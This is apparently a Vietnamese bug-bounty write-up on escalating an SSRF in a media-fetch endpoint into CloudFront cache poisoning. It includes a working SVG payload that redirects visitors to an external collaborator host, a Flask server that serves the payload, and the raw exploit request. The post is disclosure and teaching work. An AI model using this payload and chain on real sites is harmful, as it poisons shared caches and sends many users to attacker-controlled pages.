---
date: 2025-05-04 10:15:00
---

# SSRF-induced Cache Poisoning Logic Bug

Hi, hôm nay mình sẽ chia sẻ về lỗ hổng `Cache Poisoning(Biến Thể)` mà mình vô tình gặp được ở `BugCrowd`. Được rồi chúng ta bắt đầu thôi!

![alt text](/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

---
## 1. Phân tích lỗ hổng Cache Poisoning thông qua Server-Side Request Forgery ?

Được rồi tại sao mình lại nói như vậy? Có lẻ mọi người sẽ khá thắc mắc, lỗ hổng này bắt nguồn từ việc tìm được `Proxy Controller Endpoint` vì vậy mình đã POC được `SSRF` nhưng ở đây chỉ là `P5 Informational` vì `Program` họ phân định rằng `SSRF` chỉ tương tác được với dịch vụ bên ngoài hoặc tương tác với `Server Attacker` đều là `Low-Impact`. Vì vậy họ nói rằng mình nên tìm cách nâng `Impact` của nó lên cao hơn họ sẽ đánh giá lại!

![alt text](/posts/image-post/cache-poisoning-via-fetching-data/2.png)

---
## 2. Phát Hiện Cache Poisoning như nào ?

Trong quá trình đang POC `SSRF` thì 1 anh hợp tác cùng phát hiện nó ép sử dụng `Response Header` như sau: `image/svg+xml` thì trước đó khi gửi `Request` cho nó `Fetch` tới Web Attacker mình đặt là `text/html` vì vậy luôn luôn báo 400 vì vậy anh ấy đã thử từng cái `Response Header` sau khi thử thành công thì khi sử dụng `image/svg+xml` thì là status 200.

- Đây là lúc dùng `text/html` status là 400

![alt text](/posts/image-post/cache-poisoning-via-fetching-data/4.jpg)

- Còn đây là lúc dùng `image/svg+xml`

![alt text](/posts/image-post/cache-poisoning-via-fetching-data/3.jpg)

hãy để ý phần `Content-Type` ở dòng thứ 2 của `Response Header` nó chấp nhận với `image/svg+xml` và nếu các bạn tinh ý có thể thấy rằng phần tấm ảnh thứ 4 hay không ở phần cuối `Response Header` sẽ thấy nó đã Save `Cache` vào `CloudFront` với `Response Header` là `X-Cache: Hit fromt cloudfront` và cái quan trọng nhất vẫn là cái `Age: 5`. Nghĩa là thật sự nó đã Save Vào `Cache`. Và 1 điều quan trọng nữa thật sự đây là 1 `biến thể` mình lần đầu gặp vì thông thường `Cache Poisoning` sẽ không save `Cache` thông qua `Fetch` tới `Server Attacker`.

Note: Mình sử dụng https://requestrepo.com/#/requests để thực hiện thay đổi `Response Header`
![alt text](/posts/image-post/cache-poisoning-via-fetching-data/5.png)

---
## 3. Làm Sao mình có thể chứng minh chuẩn cho Vendor hiểu rằng thật sự là Cache Poisoning

Dĩ Nhiên là phải cho họ thấy mình tấn công 1 người dùng như nào thông qua `Cache Poisoning` rồi!

Mình có `Payload` như sau:

`Poc.xml`
```xml
- Payload xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://wcc9fwntbs9o7upj4haqmnxi0960uqif.oastify.com/" />
    </body>
  </foreignObject>
</svg>
```

`Payload` này được sử dụng cho việc tiến hành tấn công `Open Redirect` tới `Server Attacker`, nghe có vẻ `low-impact` nhỉ ? Nhưng quan trọng cái họ quan tâm làm thế nào để `Payload` này save vào `Cache` và gây ra tấn công Hàng Loạt mà thôi!

Note: Nãy giờ có nhiều bạn hơi thắc mắc tại sao mà mình đưa `Payload` vào được phải không, bởi vì lỗ hổng `SSRF` đã `Fetch` tới `Server Attacker` và bê toàn bộ `Payload` từ File `Poc.xml` của mình về `Response` của `Server`.

![alt text](/posts/image-post/cache-poisoning-via-fetching-data/6.png)

---
## 4. POC Cache Poisoning Thật Sự !

Có lẻ đã hoàn toàn xong ? Vâng đúng vậy chắc chắn đã xong rồi nhưng làm thế nào mình khẳng định cho họ rằng nó thật sự nghiêm trọng ?

Tiến hành di chuyển sang `VPS Server` để đào sâu hơn. Mình đã tự viết 1 Web với `Python Flask` như sau để đào sâu và tăng impact từ `P4 -> P3`

---

tạo app.py và file poc.xml cùng thư mục và chạy server

```python
- Code Cần thêm vào
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            response = make_response(f.read())
            response.headers.set('Content-Type', 'image/svg+xml')
            return response
    else:
        return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5505)
```
---

```http
- Request ở Repeater
GET /media?u=http://Ip-Demo:5505/poc.xml HTTP/2 
Host: VulnWeb.com 
Cookie: _learn_session_adhoc=23bd7501d7eb466a35f70e1bfe50adde; _ga=GA1.1.165183293.1744628537; _ga_L9HT5MZ3HD=GS1.1.1744628536.1.0.1744629162.60.0.0; _ga_Z6QQP1041C=GS1.1.1744628539.1.0.1744629162.60.0.0 
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: "Windows" Accept-Language: en-US,en;q=0.9 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 
Sec-Fetch-Dest: document 
Accept-Encoding: gzip, deflate, br 
Priority: u=0, i
```

Một điểm quan trọng ở đây khi mình nhìn `Logs` của `Server Attacker` đó là gửi `Request` hơn 10 lần đến `Server` nhưng thật sự nó chỉ có trên `Logs` 2 lần ? Nghĩa là `Server` có lỗ hổng thật sự ở đây là `Logic Bug` không phải là lỗ hổng `Cache Poisoning` thông thường nữa, vì rỏ ràng đây là 1 tính năng `Fetch` tới sau đó lưu vào `Cache` của `CloudFront` nhưng `Dev` vô tình cho phép nó `Fetch` các `Data` từ bên ngoài vì vậy gây ra lỗi `Cache Poisoning`!

![alt text](/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

## 5. Sơ đồ và giải thích chi tiết hơn

### + Phân biệt với cache poisoning “thông thường”

- **Cache poisoning thường**  
  1. Attacker gửi request có payload ngay từ client.  
  2. Server hoặc CDN nhúng payload vào response.  
  3. CDN cache response và trả lại cho các client tiếp theo.  
  4. Công việc chính: tuỳ biến tiêu đề (`Host`, `Vary`, `Cache-Control`…) để điều khiển key cache khác nhau.

- **Biến thể logic bug này**  
  1. **Trung gian là SSRF/Fetch**  
     - Payload (SVG/XML) được fetch từ **server attacker**, không phải từ browser nạn nhân.  
  2. **Server chính** vô tình để `Fetch` trả về response với header `Content-Type: image/svg+xml`, nên **CloudFront tự động cache**.  
  3. **Logic lặp lại**: sau khi cache, dù nạn nhân gửi yêu cầu nhiều lần, request không được chuyển tới SSRF nữa, vẫn sử dụng bản cache cũ—gắn chặt payload attacker lên nội dung trả về.

---

### + Tại sao gọi là “logic bug” đúng hơn?

1. **Lỗi thiết kế flow** chứ không chỉ là cấu hình cache sai.  
2. **Server attacker** được phép fetch bất kỳ URL nào và trả về thẳng cho CDN.  
3. **Flow “Fetch → Cache → Serve”** không có kiểm soát (whitelist domain, validate header response…), dẫn tới SSRF bị “leo thang” thành cache poisoning.  
4. Hậu quả nghiêm trọng hơn: không chỉ cache sai nội dung, mà còn **tấn công hàng loạt nạn nhân** thông qua payload SVG/redirect, XSS, Download File Malicious.

---

### + Flow diagram

![alt text](https://mermaid.ink/img/pako:eNp9kV9PwjAUxb9Kcw1viIx_gz6YwBCMYmLEoHHzoWyXrbFrsXQGJfvudgUMJsY-9d7fOec2tzuIVYJAoVbbcckNJbtIEhKByTDHCKi9JrhihTAR1E_QgmnOlgI3lcZ5KrRS0sz518Ho9dbbg-sIn5CnmdnjpRLJCTa4NYESSu_pWdOdE4HgEv8VYJLijC1RjFj8lmpVSJtPrXLlTgSVsIxkWdZqkUw1W2dk9lA1h-GCx488fyXn55fkJnzA9wI3Zl-OwkCoIplo-_7XSn0VzlF_oCZDY-wk1HvdbXjHBI-5Kjbkd0BlGrlrcLC6nMC1xuG9VttPMkETZ2TMDHNw7OB1GExIwOIMyU-4w9cOT09GzhfTi-e7maNTR4dQh1TzBKjRBdYhR52zqoQ_Ppnpt2pBpfWsmXxRKj_a7CLTDOiKiY2tinXCDI45s_vLf7oaZYI6sCs3QNt-14UA3cEWaN9r9Pp-p9dp-l3fG3gWflpRq9Xo9Hyv3ep3297A98s6fLmpzUbf75bfvnzLWw)
